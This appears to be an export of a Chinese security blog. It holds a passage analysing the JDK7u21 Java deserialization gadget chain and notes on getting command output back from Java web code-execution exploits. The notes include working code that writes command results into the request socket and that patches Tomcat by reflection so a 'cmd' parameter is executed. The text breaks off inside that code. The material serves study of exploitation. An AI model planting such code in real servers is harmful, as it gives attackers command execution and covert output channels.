<p>可见最后<code>unserialize(obj)</code>只是反序列化了一个<code>LinkedHashSet</code>类就触发了命令执行</p>
<p>Java在反序列化的时候会调用<code>ObjectInputStream</code>类的<code>readObject()</code>方法，如果被反序列化的类重写了<code>readObject()</code>，那么该类在进行反序列化时，Java会优先调用重写的<code>readObject()</code>方法</p>
<p><code>LinkedHashSet</code>没有<code>readObject()</code>但是继承自<code>HashSet</code></p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222200618469.png" alt="image-20200222200618469"></p>
<p><code>HashSet</code>实现了<code>Serializable</code>接口并且有<code>readObject()</code>方法，所以在反序列化<code>LinkedHashSet</code>时会调用其父类<code>HashSet</code>的<code>readObject()</code>，可以在该函数处下断点运行POC进一步跟踪调试</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222200653974.png" alt="image-20200222200653974"></p>
<p>java.util.HashSet#readObject</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222200740551.png" alt="image-20200222200740551"></p>
<p>到309行的逻辑是将POC中add到<code>set</code>的<code>templates</code>和<code>proxy</code>加入到<code>map</code>中，</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222201701982.png" alt="image-20200222201701982"></p>
<p><code>PRESENT</code>是一个常量，就是一个新的object对象</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222225202662.png" alt="image-20200222225202662"></p>
<p>继续跟进<code>put</code>方法，会在第二次调用<code>map.put</code>时进入下面的475行的位置，即现在传入的<code>key</code>是<code>proxy</code></p>
<p>java.util.HashMap#put</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222203051744.png" alt="image-20200222203051744"></p>
<p>这段代码本意是判断最新的元素是否已经存在的元素，如果不是已经存在的元素，就插入到table中，e.key为前一个元素即<code>templates</code>，key为当前元素<code>proxy</code></p>
<p><code>table[i]</code>就是一个键为我们构造的<code>templates</code>的Map</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222220213982.png" alt="image-20200222220213982"></p>
<p>当前的<code>e.key</code>和<code>key</code>，一个是<code>templates</code>,另一个是POC中的<code>proxy</code>，显然不同，<code>(k = e.key) == key </code>为false</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222220451248.png" alt="image-20200222220451248"></p>
<p>这条链想要完成是需要进入<code>key.equals(k)</code>的，依据短路特性，那么必须要<code>e.hash == hash</code>为true，也就是需要满足 <code>hash(templates)== hash(proxy)</code>，看起来貌似不可能，但漏洞作者确实做到了（大写的佩服）</p>
<p>这里hash的绕过方法就暂时放在下面，先接着跟踪<code>key.equals(k)</code></p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222203511373.png" alt="image-20200222203511373"></p>
<p>由于POC中使用动态代理，这里调用<code>Templates.equals()</code>就会进入<code>handler</code>的<code>invoke</code></p>
<p>sun.reflect.annotation.AnnotationInvocationHandler#invoke</p>
<p><code>var1</code>就是上图中的<code>key</code>，<code>var2</code>是<code>equals</code>方法对象，<code>var3</code>是传入的参数数组，即上图中的<code>k</code>(TemplatesImpl)</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222204446774.png" alt="image-20200222204446774"></p>
<p>继续跟入<code>equalsImpl</code></p>
<p>sun.reflect.annotation.AnnotationInvocationHandler#equalsImpl</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222210434857.png" alt="image-20200222210434857"></p>
<p>分析之前先看一下这个类的相关方法和属性</p>
<p>首先是构造函数</p>
<p>sun.reflect.annotation.AnnotationInvocationHandler#AnnotationInvocationHandler</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222210525096.png" alt="image-20200222210525096"></p>
<p>在构造handler时<code>ctor.newInstance(Templates.class, map)</code></p>
<p>即这里的<code>this.type</code>和<code>this.memberValues</code>分别是<code>Templates.class</code>和<code>map</code> </p>
<p>sun.reflect.annotation.AnnotationInvocationHandler#getMemberMethods</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222210905902.png" alt="image-20200222210905902"></p>
<p>并未对<code>this.memberMethods</code>赋值，所以这里进入if分支，最后返回的是<code>this.type</code>的所有方法，即<code>Templates</code>的所有方法</p>
<p>sun.reflect.annotation.AnnotationInvocationHandler#asOneOfUs</p>
<p>判断<code>var1</code>对象若是一个<code>AnnotationInvocationHandler</code>实例的话则转换为<code>AnnotationInvocationHandler</code></p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222211521556.png" alt="image-20200222211521556"></p>
<p>然后接着看<code>equalsImpl</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Boolean <span class="title function_">equalsImpl</span><span class="params">(Object var1)</span> &#123;<span class="comment">//var1是POC中构造的templates</span></span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">this</span>.type.isInstance(var1)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Method[] var2 = <span class="built_in">this</span>.getMemberMethods();<span class="comment">//var2是Templates的所有方法</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">var3</span> <span class="operator">=</span> var2.length;<span class="comment">//Templates方法的数量</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;<span class="comment">//迭代Templates的所有方法</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">var5</span> <span class="operator">=</span> var2[var4];<span class="comment">//var5为Templates的中的某个方法</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> var5.getName();<span class="comment">//var6为该方法的名称</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">var7</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.get(var6);<span class="comment">//在memberValues中获取key为var6的值，但memberValues只有一个key为f5a5a608的键值对，所以var7为null</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="type">AnnotationInvocationHandler</span> <span class="variable">var9</span> <span class="operator">=</span> <span class="built_in">this</span>.asOneOfUs(var1);<span class="comment">//var9也为null</span></span><br><span class="line">            <span class="keyword">if</span> (var9 != <span class="literal">null</span>) &#123;</span><br><span class="line">                var8 = var9.memberValues.get(var6);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var8 = var5.invoke(var1);<span class="comment">//运行会到这里，所以会调用Templates中的所有方法</span></span><br><span class="line">                &#125; <span class="keyword">catch</span> (InvocationTargetException var11) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IllegalAccessException var12) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AssertionError</span>(var12);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!memberValueEquals(var7, var8)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>既然调用了<code>Templates</code>中的所有方法，自然包括<code>getOutputProperties()</code>，即完成了命令执行</p>
<h2 id="Hash绕过"><a href="#Hash绕过" class="headerlink" title="Hash绕过"></a>Hash绕过</h2><p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222203511373.png" alt="image-20200222203511373"></p>
<p>java.util.HashMap#hash</p>
<p><code>hash()</code>中调用了对象本身的<code>hashCode()</code></p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222230037778.png" alt="image-20200222230037778"></p>
<p>调用<code>hash(templates)</code>的时候，这个类没有重写，调用的是<code>templates</code>默认的<code>hashCode()</code>方法</p>
<p>当调用<code>hash(proxy)</code>的时候，则会跳到<code>AnnotationInvocationHandler.invoke()</code></p>
<p>sun.reflect.annotation.AnnotationInvocationHandler#invoke</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222223127808.png" alt="image-20200222223127808"></p>
<p>sun.reflect.annotation.AnnotationInvocationHandler#hashCodeImpl</p>
<p>该方法会从<code>memberValues</code>中进行遍历，并且依次计算<code>key.hashCode()</code>，而这个<code>memberValues</code>是我们在初始化<code>AnnotationInvocationHandler</code>的时候传入的<code>map</code></p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222223209538.png" alt="image-20200222223209538"></p>
<p>sun.reflect.annotation.AnnotationInvocationHandler#memberValueHashCode</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200222230700698.png" alt="image-20200222230700698"></p>
<p>所以</p>
<p><code>var1=0;    var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())</code></p>
<p>相当于</p>
<p><code>var1 = 127 * map中键的hashCode ^ map中值的hashCode</code></p>
<p>POC中构造<code>map.put(&quot;f5a5a608&quot;, templates)</code>,而字符串的hashCode为0</p>
<p>所以</p>
<p><code>var1 = 127 * 0 ^ templates的hashCode</code></p>
<p><code>var1 = templates的hashCode</code></p>
<h2 id="map-put的位置问题"><a href="#map-put的位置问题" class="headerlink" title="map.put的位置问题"></a>map.put的位置问题</h2><p>仔细观察POC会发现，并没有在创建一个HashMap后就立即插入数据，而是把<code>map.put(&quot;f5a5a608&quot;, templates)</code>放在了<code>set.add</code>之后</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200223000229937.png" alt="image-20200223000229937"></p>
<p>如果放在<code>set.add</code>之前会直接在本地触发命令执行，并且得到的序列化之后的数据不能反序列化成功</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200223000741750.png" alt="image-20200223000741750"></p>
<p>java.util.HashSet#add</p>
<p>这是因为add方法中会直接调用map.put，然后后面的过程就同之前分析的一致了</p>
<p><img src="/JDK7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Gadgets/image-20200223001156031.png" alt="image-20200223001156031"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/6884#toc-7">JDK反序列化Gadgets 7u21</a></p>
<p><a href="https://www.freebuf.com/vuls/175754.html">JDK7u21反序列化漏洞分析</a></p>
<p><a href="https://blog.csdn.net/ShuSheng0007/article/details/81269295">秒懂Java动态编程（Javassist研究）</a></p>
<p><a href="https://www.jianshu.com/p/6e962d1e7ddd">Java动态代理-实战</a></p>
]]></content>
      <tags>
        <tag>Java反序列化漏洞</tag>
        <tag>JDK7u21</tag>
      </tags>
  </entry>
  <entry>
    <title>Java Web代码执行漏洞回显总结</title>
    <url>/2020/03/31/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>最近在学习几位师傅研究的Java Web代码执行漏洞下的回显方式，收获很多，能力有限，此文也没有什么新的思路，仅当个人学习笔记</p>
<p>在java漏洞利用中经常出现获取不到执行结果的情况，之前常见的方法即通过报错回显，OOB等，但在国内环境下大多数情况下都限制了对外的网络访问</p>
<span id="more"></span>

<h2 id="通过文件描述符读写网络连接"><a href="#通过文件描述符读写网络连接" class="headerlink" title="通过文件描述符读写网络连接"></a>通过文件描述符读写网络连接</h2><p>这种方法的大概思路便是通过执行java代码获取发起这次请求时对应的服务端socket文件描述符，然后在文件描述符中写入回显内容</p>
<h3 id="获取本次Http请求的socket文件描述符"><a href="#获取本次Http请求的socket文件描述符" class="headerlink" title="获取本次Http请求的socket文件描述符"></a>获取本次Http请求的socket文件描述符</h3><p>在linux系统中，&#x2F;proc&#x2F;net&#x2F;tcp文件显示了tcp的连接信息</p>
<p>先用nc监听</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200331105304481.png" alt="image-20200331105304481"></p>
<p>建立连接</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200331105350587.png" alt="image-20200331105350587"></p>
<p>&#x2F;proc&#x2F;net&#x2F;tcp 中即可用服务端监听的端口确定本次连接，22B8(8888)，对应还有一个inode</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200331105545435.png" alt="image-20200331105545435"></p>
<p>获取nc进程id</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200331105756858.png" alt="image-20200331105756858"></p>
<p>查看nc打开的文件，其中就有一个socket文件，且socket后对应的数字即是&#x2F;proc&#x2F;net&#x2F;tcp中的inode</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200331105901382.png" alt="image-20200331105901382"></p>
<p>在&#x2F;proc&#x2F;net&#x2F;tcp中同样有客户端发起请求的地址和端口号，那么通过指定客户端发起请求的源端口号就可拿到对应请求的socket文件的inode，再通过inode就能在fd目录下得到socket文件描述符</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200331110159902.png" alt="image-20200331110159902"></p>
<p>获取源端口为0F98的inode</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200331111626294.png" alt="image-20200331111626294"></p>
<p>获取inode为837648的文件描述符</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200331111442625.png" alt="image-20200331111442625"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">inode=`<span class="built_in">cat</span> /proc/net/tcp|awk <span class="string">&#x27;&#123;if($10&gt;0)print&#125;&#x27;</span>|awk <span class="string">&#x27;&#123;print $3,$10&#125;&#x27;</span>|grep -i 0F98|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`</span><br><span class="line">fd=`<span class="built_in">ls</span> -l /proc/18866/fd|grep <span class="variable">$inode</span>|awk <span class="string">&#x27;&#123;print $9&#125;&#x27;</span>`</span><br><span class="line"><span class="built_in">echo</span> -n <span class="variable">$fd</span></span><br></pre></td></tr></table></figure>



<h3 id="Java读写socket"><a href="#Java读写socket" class="headerlink" title="Java读写socket"></a>Java读写socket</h3><p><a href="https://www.00theway.org/2020/01/17/java-god-s-eye/">核心代码：</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;FileDescriptor&gt; c= FileDescriptor.class.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Integer.TYPE&#125;);</span><br><span class="line">c.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="string">&quot;00theway&quot;</span>;</span><br><span class="line"><span class="type">FileOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(c.newInstance(<span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">4</span>)));</span><br><span class="line">os.write(ret.getBytes());</span><br><span class="line">os.close();</span><br></pre></td></tr></table></figure>



<p>方便起见，直接用spring-boot创建了一个项目</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//获取文件描述符</span></span><br><span class="line">            String[] cmd = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;inode=`cat /proc/net/tcp|awk &#x27;&#123;if($10&gt;0)print&#125;&#x27;|awk &#x27;&#123;print $3,$10&#125;&#x27;|grep -i 22B8|awk &#x27;&#123;print $2&#125;&#x27;`;fd=`ls -l /proc/$PPID/fd|grep $inode|awk &#x27;&#123;print $9&#125;&#x27;`;echo -n $fd&quot;</span>&#125;;</span><br><span class="line">            java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">            java.io.<span class="type">InputStreamReader</span> <span class="variable">isr</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(in);</span><br><span class="line">            java.io.<span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(isr);</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">stringBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">                stringBuilder.append(line);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">fd</span> <span class="operator">=</span> Integer.valueOf(stringBuilder.toString()).intValue();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取命令执行结果</span></span><br><span class="line">            cmd = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;whoami&quot;</span>&#125;;</span><br><span class="line">            in = Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">            isr = <span class="keyword">new</span> <span class="title class_">java</span>.io.InputStreamReader(in);</span><br><span class="line">            br = <span class="keyword">new</span> <span class="title class_">java</span>.io.BufferedReader(isr);</span><br><span class="line">            stringBuilder = <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="keyword">while</span> ((line = br.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">                stringBuilder.append(line);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> stringBuilder.toString();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//拼装成正常的HTTP响应</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">response</span> <span class="operator">=</span> <span class="string">&quot;HTTP/1.1 200 OK\r\n&quot;</span></span><br><span class="line">                    + <span class="string">&quot;Content-Type: text/html\r\n&quot;</span></span><br><span class="line">                    + <span class="string">&quot;Content-Length: &quot;</span> + result.length()</span><br><span class="line">                    + <span class="string">&quot;\r\n\r\n&quot;</span></span><br><span class="line">                    + result</span><br><span class="line">                    + <span class="string">&quot;\r\n\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//写入socket</span></span><br><span class="line">            java.lang.reflect.Constructor c=java.io.FileDescriptor.class.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Integer.TYPE&#125;);</span><br><span class="line">            c.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            java.io.<span class="type">FileOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">Integer</span>(fd)&#125;));</span><br><span class="line">            os.write(response.getBytes());</span><br><span class="line">            os.close();</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200331134858887.png" alt="image-20200331134858887"></p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200331154059910.png" alt="image-20200331154059910"></p>
<h3 id="局限"><a href="#局限" class="headerlink" title="局限"></a>局限</h3><p>此种方法需要通过源端口或者ip的过滤来筛选出当前请求，但应用若在内网中或者在负载均衡等之后的话就没有办法再筛选出请求了，而且也只限于linux系统</p>
<h2 id="获取Tomcat-Response"><a href="#获取Tomcat-Response" class="headerlink" title="获取Tomcat Response"></a>获取Tomcat Response</h2><p>这种方法的大概思路是顺着调用栈中response的传递过程，寻找response是否在某一处被记录下来</p>
<p>然后通过反射修改变量，来改变Tomcat处理请求时的流程，使得Tomcat处理请求时便将request,response存入ThreadLocal中，最后在反序列化的时候便可以利用ThreadLocal来取出response，然后写入回显</p>
<h3 id="寻找Tomcat-Response"><a href="#寻找Tomcat-Response" class="headerlink" title="寻找Tomcat Response"></a>寻找Tomcat Response</h3><p>要求类型得是ThreadLocal，这样才是属于当前线程，而且最好是一个static静态变量，如此，在org.apache.catalina.core.ApplicationFilterChain找到合适的变量lastServicedResponse</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200331141700184.png" alt="image-20200331141700184"></p>
<p>而且在处理我们Controller逻辑之前，已经记录下了request和response</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200331141757264.png" alt="image-20200331141757264"></p>
<h3 id="获取response"><a href="#获取response" class="headerlink" title="获取response"></a>获取response</h3><p>但是这里if中的条件是不满足的，不会进入到request和response中的逻辑中去，而且就算if中的条件满足了，由于此时request和response为null，那么赋值也会失败</p>
<p><img src="/Java-Web%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%9B%9E%E6%98%BE%E6%80%BB%E7%BB%93/image-20200331142030302.png" alt="image-20200331142030302"></p>
<p>所以需要通过反射初始化该static final修饰的变量，修改ApplicationDispatcher.WRAP_SAME_OBJECT</p>
<p>第一次请求修改成功之后，第二次请求便能通过ApplicationFilterChain类拿到request和response</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//获取各字段</span></span><br><span class="line">            java.lang.reflect.Field WRAP_SAME_OBJECT=Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">applicationFilterChain</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>);</span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">lastServicedRequest</span> <span class="operator">=</span> applicationFilterChain.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">lastServicedResponse</span> <span class="operator">=</span> applicationFilterChain.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//去掉final修饰符</span></span><br><span class="line">            java.lang.reflect.<span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> java.lang.reflect.Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">            modifiers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            modifiers.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">            modifiers.setInt(lastServicedRequest, lastServicedRequest.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line">            modifiers.setInt(lastServicedResponse, lastServicedResponse.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//设置允许访问</span></span><br><span class="line">            WRAP_SAME_OBJECT.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedRequest.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            lastServicedResponse.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//如果是第一次请求，则修改各字段，否则获取cmd参数执行命令并返回结果</span></span><br><span class="line">            <span class="keyword">if</span>(!WRAP_SAME_OBJECT.getBoolean(<span class="literal">null</span>))&#123;</span><br><span class="line">                WRAP_SAME_OBJECT.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">                lastServicedRequest.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">                lastServicedResponse.set(<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                ThreadLocal&lt;javax.servlet.ServletRequest&gt; threadLocalRequest = (ThreadLocal&lt;javax.servlet.ServletRequest&gt;) lastServicedRequest.get(<span class="literal">null</span>);</span><br><span class="line">                ThreadLocal&lt;javax.servlet.ServletResponse&gt; threadLocalResponse = (ThreadLocal&lt;javax.servlet.ServletResponse&gt;) lastServicedResponse.get(<span class="literal">null</span>);</span><br><span class="line">                javax.servlet.<span class="type">ServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> threadLocalRequest.get();</span><br><span class="line">                javax.servlet.<span class="type">ServletResponse</span> <span class="variable">response</span> <span class="operator">=</span> threadLocalResponse.get();</span><br><span class="line"></span><br><span class="line">                String cmd=request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>(cmd!=<span class="literal">null</span>)&#123;</span><br><span class="line">                    String[] cmds=<span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>))&#123;</span><br><span class="line">                        cmds=<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span 